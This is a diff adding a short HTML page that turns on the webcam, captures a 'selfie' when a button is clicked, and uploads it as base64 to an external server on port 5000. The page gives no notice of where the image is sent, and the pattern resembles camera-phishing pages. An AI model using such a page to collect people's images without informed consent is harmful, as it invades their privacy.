@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Image</title>
+</head>
+<body>
+    <h1>Capture Image</h1>
+    <button id="capture-btn">Capture Selfie</button>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const videoElement = document.getElementById('video');
+        const captureButton = document.getElementById('capture-btn');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let imageData = '';
+
+        // Access webcam
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                videoElement.srcObject = stream;
+            }).catch(err => {
+                console.error("Error accessing camera: ", err);
+            });
+
+        // Capture image when button is clicked
+        captureButton.addEventListener('click', () => {
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            imageData = canvas.toDataURL('image/png');  // Convert image to base64
+            sendImageToServer(imageData);
+        });
+
+        // Send image to the server
+        function sendImageToServer(imageData) {
+            fetch('https://precious.prexzyvilla.web.id:5000/upload', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ image: imageData })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Image sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending image:', error);
+            });
+        }
+    </script>
+</body>
+</html>
